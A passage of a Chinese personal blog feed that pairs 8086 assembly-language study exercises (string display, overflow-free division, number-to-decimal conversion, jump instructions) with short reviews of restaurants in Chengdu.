   ;所有的空格        ;第一次没有考虑到空格是一个字节,这里不应该用16位的,应该用8位的        mov al,' '        mov es:[bp+4H],al        mov es:[bp+9H],al        mov es:[bp+0FH],al        pop cx        add di,2        add bx,4        add bp,16        loop overall    ret;名称：divdw;功能：进行不会产生溢出的除法运算,被除数为dword,除数为word.结果为dword;参数: ax dword的低16位 | dx dword高16位 | cx除数16位;返回: dx 结果的高16位, ax 结果的低16位, cx 余数;应用举例：计算 1000000/10(F4240H/0AH);结果: dx = 0001H  ax = 86A0H cx = 0divdw:    push si    push bx    push ax    mov ax,dx    div cl    mov bl,al    mov bh,00H    mov al,ah    mov ah,00H;bx保留商,ax保留余数    pop si    mov dx,si    mov dx,ax    mov ax,si    div cx;32/16 ax余数,dx商    mov si,bx    mov bx,dx    mov dx,si    mov cx,bx    pop bx    pop si    retcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-call和ret指令</title>
      <link href="/2021/10/16/hui-bian-yu-yan-xue-xi-call-he-ret-zhi-ling/"/>
      <url>/2021/10/16/hui-bian-yu-yan-xue-xi-call-he-ret-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="call和ret指令"><a href="#call和ret指令" class="headerlink" title="call和ret指令"></a>call和ret指令</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211016111954.png" alt="思维导图"></p><p>关于使用栈来传递参数并用ret返回的实际例子还是需要多看才行。</p><h2 id="综合实验"><a href="#综合实验" class="headerlink" title="综合实验"></a>综合实验</h2><h3 id="显示字符串"><a href="#显示字符串" class="headerlink" title="显示字符串"></a>显示字符串</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">名称：show_str功能：在指定的位置,用指定的颜色,显示一个用0结束的字符串参数：dh 行号(0-24), dl 列号 0-79, cl颜色, ds:si指向字符串的首地址返回: 无应用举例：在屏幕的8行3列,用绿色显示出data段中的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codedata segment    db 'Welcome to masm!',0data endscode segmentstart:    mov dh,8    mov dl,3    mov cl,2    mov ax,data    mov ds,ax    mov si,0    call show_str        mov ax,4c00h    int 21hshow_str:    push es    push bp    push bx    mov ax,0B800H    mov es,ax    ;找行号对应的内存地址    mov al,160    mul dh    mov bp,ax    sub bp,160    ;找列对应的内存地址    mov al,2    mul dl    mov di,ax    sub di,2    ;把颜色转移一下    mov bl,cl    push cxs:     mov cl,ds:[si]    mov ch,0    jcxz ok    mov es:[bp+di],cl    mov es:[bp+di+1],bl    add di,2    add si,1    jmp short sok:    pop cx    pop bx    pop bp    pop es    retcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211016112701.png" alt="显示字符串"></p><h3 id="解决除法溢出的问题"><a href="#解决除法溢出的问题" class="headerlink" title="解决除法溢出的问题"></a>解决除法溢出的问题</h3><p>用div指令做出发的时候可能产生除法溢出,比如:1000000/10就不能用div指令来算</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">名称：divdw功能：进行不会产生溢出的除法运算,被除数为dword,除数为word.结果为dword参数: ax dword的低16位 | dx dword高16位 | cx除数返回: dx 结果的高16位, ax 结果的低16位, cx 余数应用举例：计算 1000000/10(F4240H/0AH)结果: dx = 0001H  ax = 86A0H cx = 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesgdatasg segmentdatasg endscodesg segmentstart:    mov ax,4240H    mov dx,000FH    mov cx,0AH    call divdw    mov ax,4c00h    int 21h;这里面就是因为 div 被除数默认放在ax | dx(高)和ax(低)中,所以比较麻烦;除数可以放在寄存器里也可以放在内存单元里，有8/16两种, 8-AL商 AH余数 || 16-AX商 DX余数;再就是因为数据运算要符合相同的类型,同为16或同为8,在寄存器里面换来换去的就比较麻烦divdw:    push ax    mov ax,dx    div cl    mov bl,al    mov bh,00H    mov al,ah    mov ah,00H;bx保留商,ax保留余数    pop si    mov dx,si    mov dx,ax    mov ax,si    div cx;32/16 ax余数,dx商    mov si,bx    mov bx,dx    mov dx,si    mov cx,bx    retcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行截图-1"><a href="#运行截图-1" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211016113513.png" alt="解决除法溢出的问题"></p><h3 id="数值显示"><a href="#数值显示" class="headerlink" title="数值显示"></a>数值显示</h3><p>将12666以字符串的形式显示到显示器上</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">名称：dtoc功能：将word型数据转变为十进制的字符串,字符串以0为结尾符参数：ax word型数据    ds:si指向字符串的首地址返回：无应用举例: 将12666以十进制的形式在屏幕的8行3列,用绿色显示出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="改进前代码"><a href="#改进前代码" class="headerlink" title="改进前代码"></a>改进前代码</h4><p>改进前,主要是利用在内存中的位置,来对字符串进行逆向的输出。因为算余数的话,顺序是66621得倒过来才行</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:code,ds:datadata segment    db 10 dup(0)data endscode segmentstart:    mov ax,12666    mov bx,data    mov ds,bx    mov si,0    call dtoc        mov dh,8    mov dl,3    mov cl,2    call show_str    mov ax,4c00h    int 21hdtoc:    mov dx,00    mov bh,00    mov bl,10;感觉逻辑没问题啊,商越界了 得用32/16的    div bx ;为什么会在这里卡住呢,感觉像是无限循环？？？    mov ch,00h    mov cl,dl    jcxz ok    add byte ptr cx,0030H    mov ds:[si],cx    inc si    jmp dtocok:    ;也不是不能操作栈,在之前push进去的,在这里都pop出来就不会有问题,要不然回影响ret指令pop IP    ;后面你可以再试试,这个程序还是有问题    sub si,1;运行完之后si=5,然而ds[si]此时刚好是0,所以你得减去个1才行    retshow_str:    push es    push bp    push bx    mov ax,0B800H    mov es,ax    ;找行号对应的内存地址    mov ah,00    mov al,160    mul dh    mov bp,ax    sub bp,160    ;找列对应的内存地址    mov ah,00    mov al,2    mul dl    mov di,ax    sub di,2    ;把颜色转移一下    mov bl,cl    push cxs:     mov cl,ds:[si]    mov ch,0    jcxz ok1    mov es:[bp+di],cl    mov es:[bp+di+1],bl    add di,2    sub si,1    jmp short sok1:    pop cx    pop bx    pop bp    pop es    ret        code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="改进后代码"><a href="#改进后代码" class="headerlink" title="改进后代码"></a>改进后代码</h4><p>改进之后,利用了栈的特性,先将算出来的余数入栈,然后再出栈写到内存里.这样就刚好倒过来了。不过需要注意的是,<code>在子程序中push进去的,在ret之前都要pop出来哦！</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:code,ds:datadata segment    db 10 dup(0)data endscode segmentstart:    mov ax,12666    mov bx,data    mov ds,bx    mov si,0    call dtoc        mov dh,8    mov dl,3    mov cl,2    call show_str    mov ax,4c00h    int 21hdtoc:    mov dx,00    mov bh,00    mov bl,10;感觉逻辑没问题啊,商越界了 得用32/16的    div bx ;为什么会在这里卡住呢,感觉像是无限循环？？？    mov ch,00h    mov cl,dl    jcxz ok    add byte ptr cx,0030H    mov ds:[si],cx    inc si    jmp dtocok:    ;也不是不能操作栈,在之前push进去的,在这里都pop出来就不会有问题,要不然回影响ret指令pop IP    ;后面你可以再试试,这个程序还是有问题    sub si,1;运行完之后si=5,然而ds[si]此时刚好是0,所以你得减去个1才行    retshow_str:    push es    push bp    push bx    mov ax,0B800H    mov es,ax    ;找行号对应的内存地址    mov ah,00    mov al,160    mul dh    mov bp,ax    sub bp,160    ;找列对应的内存地址    mov ah,00    mov al,2    mul dl    mov di,ax    sub di,2    ;把颜色转移一下    mov bl,cl    push cxs:     mov cl,ds:[si]    mov ch,0    jcxz ok1    mov es:[bp+di],cl    mov es:[bp+di+1],bl    add di,2    sub si,1    jmp short sok1:    pop cx    pop bx    pop bp    pop es    ret        code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行截图-2"><a href="#运行截图-2" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211016114256.png" alt="数值显示"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-2-美国烤肉</title>
      <link href="/2021/10/16/mei-shi-pian-2-mei-guo-kao-rou/"/>
      <url>/2021/10/16/mei-shi-pian-2-mei-guo-kao-rou/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次由我室友和我还有另外两个同学一同前往，这个也是贵,最后人均花了105,不过体验还算可以。点了四个菜？名字忘了,大体就是烤肉串、意面、洋葱炒牛绒外加那种饼可以卷起来吃、烤肉三拼(鸡肉、牛肉、猪肉)</p><p>也是想体验一把视频里大口吃肉的感觉,但是回想起来,之前寒假的时候,我爸炖了好多排骨,同样是大口吃肉,为什么当时我就没有胃口吃呢？<br>为了弥补之前的遗憾,下一个寒假,我一定要将烤肉吃腻。大院子加上碳烤,想想就很过瘾。</p><h1 id="照骗"><a href="#照骗" class="headerlink" title="照骗"></a>照骗</h1><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6DFA58B31EAAC59588475432A6AC93D7.jpg" alt="1"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0CD8EF7A1D8C4E7CCCB4C33B921C5F98.jpg" alt="这个意面真的贵"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-1-汉堡店</title>
      <link href="/2021/10/16/mei-shi-pian-1-han-bao-dian/"/>
      <url>/2021/10/16/mei-shi-pian-1-han-bao-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次是跟舍友去吃的一个汉堡店,本来是想着能有那种美食视频上面看到的那样,有那种一口都塞不下的汉堡。地点就在川大望江校区地铁站的周边。</p><p>最主要是比较贵，我和室友一共花了<code>148</code>,就点了<code>两个汉堡</code>(具体价钱给忘了)`一盘鸡翅`(6个/32)</p><h2 id="汉堡"><a href="#汉堡" class="headerlink" title="汉堡"></a>汉堡</h2><p>结果这汉堡并不是很大,口感的话,我是觉得就一般,牛肉饼反而有一种腥味在。总体感觉就一般。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/D5181D27FB0D2ABF12A801D3EEE3666A.jpg" alt="汉堡1"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/C7B2046D0B0F24404CDB4355A0113227.jpg" alt="汉堡2"></p><h2 id="鸡翅"><a href="#鸡翅" class="headerlink" title="鸡翅"></a>鸡翅</h2><p>鸡翅的话,还凑合把,主要是有蜂蜜芥末的酱。个人比较喜欢</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/B977411C890AA8437C60E59E84F4538A.jpg" alt="鸡翅"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-3-鸡毛店</title>
      <link href="/2021/10/16/mei-shi-pian-3-ji-mao-dian/"/>
      <url>/2021/10/16/mei-shi-pian-3-ji-mao-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次由我室友和我还有另外两个同学一同前往，这个还算可以,最后人均花了65? 点了 酸菜鱼？毛血旺？其他的忘了,这都是后面整理的了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211016180849.jpg" alt="照骗1"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-4-东北菜</title>
      <link href="/2021/10/16/mei-shi-pian-4-dong-bei-cai/"/>
      <url>/2021/10/16/mei-shi-pian-4-dong-bei-cai/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次由我和我的两个舍友,这家店相对来说比较实惠,个人感觉也比较好吃。可能是因为自己家乡也在北方的原因。</p><ul><li>地三鲜</li><li>锅包肉—感觉跟我爸弄得差不多~~~</li><li>饺子</li><li>炸茄盒</li><li><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211016181146.jpg" alt="东北菜"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-5-麦当劳</title>
      <link href="/2021/10/16/mei-shi-pian-5-mai-dang-lao/"/>
      <url>/2021/10/16/mei-shi-pian-5-mai-dang-lao/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次是所有的舍友了,毕竟一个舍友请客,点的麦当劳,有汉堡、可乐、炸鸡、小龙虾和粉条、薯条、披萨~~ 如果要是硬要算人均的话,应该在50左右</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211016181638.jpg" alt="麦当劳"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-6-陶德砂锅</title>
      <link href="/2021/10/16/mei-shi-pian-6-tao-de-sha-guo/"/>
      <url>/2021/10/16/mei-shi-pian-6-tao-de-sha-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次是舍友和我外加上两个大寝的舍友,这次的菜也非常好吃，人均55? 可惜照骗我只有一张了。有一个鲫鱼饺子、红烧猪蹄、还有一个肥肠、还有虾仁米线,还点了一些包子。</p><p>本来想尝尝肥肠的,因为之前看别人在视频里面吃的时候,我感觉很香。结果吃了一口,差点原地~~</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1E5077B3A17D99CD7EDF42E4F291B254.jpg" alt="照片"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-数据处理的两个基本问题</title>
      <link href="/2021/10/13/hui-bian-yu-yan-xue-xi-shu-ju-chu-li-de-liang-ge-ji-ben-wen-ti/"/>
      <url>/2021/10/13/hui-bian-yu-yan-xue-xi-shu-ju-chu-li-de-liang-ge-ji-ben-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="数据处理的两个基本问题"><a href="#数据处理的两个基本问题" class="headerlink" title="数据处理的两个基本问题"></a>数据处理的两个基本问题</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>还是画这样的图，感觉思路清晰一些。新的东西并不多,大多感觉还是对以往问题的一个总结。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013102156.png" alt="思维导图"></p><h2 id="综合实验"><a href="#综合实验" class="headerlink" title="综合实验"></a>综合实验</h2><p>编程,将data段中的数据按如下格式写入到table段中,并计算21年中的人均收入(取整),结果也按照下面的格式保存在table段中。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013102611.png" alt="题干1"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013102632.png" alt="题干2"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>  具体的思路就是,利用内外循环,大循环循环00-10H-20H这样每一行的数据,小循环循环每个数据项</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>中具体的字节\字。同时利用idata和si</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesg,ds:datadata segment    ;0    db '1975','1976','1977','1978','1979','1980','1981','1982','1983'    db '1984','1985','1986','1987','1988','1989','1990','1991','1992'    db '1993','1994','1995'    ;54H    dd 16,22,382,1356,2390,8000,160000,24486,50065,97479,140417,197514    dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5973000        ;A8H    dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226    dw 11542,14430,15257,17800data endstable segment    db 21 dup ('year summ ne ?? ')table endscodesg segment;正好印证了两个重点的地方 1.数据在什么地方 2.数据的大小;算人均收入的那个还没有写--------------------------------------------------------start:    mov ax,data    mov ds,ax        mov ax,table    mov es,ax;这里经常把ax写成table了    mov bx,0;bx定位data段,bx year和收入都是四个字节可以公用,但是雇员数是两个字节的没办法公用    mov bp,0;bp定位es段    mov di,0;di用来在循环中服务于雇员数,因为它是两个字节,没办法跟year和outcome公用一个递增寄存器    mov cx,21    overall:        push cx        mov cx,2        mov si,0        year:            ;年份的4字节---两个字            mov ax,ds:[bx+si]            mov es:[bp+si],ax            add si,2            loop year        mov cx,2        mov si,0        outcome:            ;收入的4字节---两个字            mov ax,ds:[bx+54H+si]            mov es:[bp+5H+si],ax            add si,2            loop outcome        ;雇员数---一个字        mov ax,ds:[di+0A8H]        mov es:[bp+0AH],ax        ;计算人均收入        mov ax,es:[bp+5H];计算人均收入的,要用es的定位,那偏移量就得按照es的来。最开始写成ds的定位了[bx+54H]了        mov dx,es:[bp+5H+2]        div word ptr es:[bp+0AH]        mov es:[bp+0DH],ax        ;所有的空格        ;第一次没有考虑到空格是一个字节,这里不应该用16位的,应该用8位的        mov al,' '        mov es:[bp+4H],al        mov es:[bp+9H],al        mov es:[bp+0FH],al        pop cx        add di,2        add bx,4        add bp,16        loop overall    ;计算收入    mov ax,4c00h    int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-转移指令原理</title>
      <link href="/2021/10/13/hui-bian-yu-yan-xue-xi-zhuan-yi-zhi-ling-yuan-li/"/>
      <url>/2021/10/13/hui-bian-yu-yan-xue-xi-zhuan-yi-zhi-ling-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="转移指令原理"><a href="#转移指令原理" class="headerlink" title="转移指令原理"></a>转移指令原理</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013193650.png" alt="思维导图"></p><h2 id="根据位移进行转移的意义"><a href="#根据位移进行转移的意义" class="headerlink" title="根据位移进行转移的意义"></a>根据位移进行转移的意义</h2><p>在对应的机器码中不包含转移的目的地址,而包含的是到目的地址的位移。这种设计,方便了程序段在内存中的浮动装配。使程序装在内存中的不同位置都可正确执行,因为在执行时,只涉及到位移,而不是地址。如果是地址的话,程序没有装载到对应的位置,就会造成程序没有办法正确执行。</p><h2 id="综合实验"><a href="#综合实验" class="headerlink" title="综合实验"></a>综合实验</h2><h3 id="实验8-分析一个奇怪的程序"><a href="#实验8-分析一个奇怪的程序" class="headerlink" title="实验8 分析一个奇怪的程序"></a>实验8 分析一个奇怪的程序</h3><p>分析下面的程序,在运行前思考:这个程序可以正确返回吗？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesgcodesg segment    mov ax,4c00h    int 21h;反正就是刚好利用了jmp 的相对位移的特性.short 8位位移 = 标号处的地址-jmp指令后的第一个字节地址start:    mov ax,0s:    nop    nop    mov di,offset s    mov si,offset s2    mov ax,cs:[si]    mov cs:[di],axs0:    jmp short ss1:    mov ax,0    int 21h    mov ax,0s2:    jmp short s1    nopcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以正确返回,刚好利用了jmp 的相对位移的特性.short 8位位移 = 标号处的地址-jmp指令后的第一个字节地址。当程序再次跳回到s标号处执行时,其第一条指令为 EBF6,就刚好是往上面跳到了 <code>mov ax,4c00h</code></p><h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013194841.png" alt="实验8"></p><h3 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h3><p>在屏幕中间分别显示绿色\绿底红色\白底蓝色的字符串”welcome to masm!”.</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>感觉这个没用到这章讲的东西啊??!!，还是因为我水平不行？？</p><p><strong>我是真的憨憨,第一开始没有注意到题目中说的是要在屏幕中间显示</strong></p><h5 id="改进前-写了三个循环"><a href="#改进前-写了三个循环" class="headerlink" title="改进前,写了三个循环"></a>改进前,写了三个循环</h5><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesg,ds:datasgdatasg segment    db 'welcome to masm!'datasg endscodesg segmentstart:    mov ax,datasg    mov ds,ax    mov ax,0B800H    mov es,ax;1        mov bx,6E0H    mov si,0    mov di,80    mov cx,16s:      mov al,ds:[si]    mov es:[bx+di],al    mov byte ptr es:[bx+di+1],02H    add di,2    add si,1    loop s;2    mov bx,780H    mov si,0    mov di,80    mov cx,16s1:      mov al,ds:[si]    mov es:[bx+di],al    mov byte ptr es:[bx+di+1],24H    add di,2    add si,1    loop s1;3    mov bx,820H    mov si,0    mov di,80    mov cx,16s2:      mov al,ds:[si]    mov es:[bx+di],al    mov byte ptr es:[bx+di+1],71H    add di,2    add si,1    loop s2    mov ax,4c00h    int 21hcodesg endsend start<span aria-hidden="true" 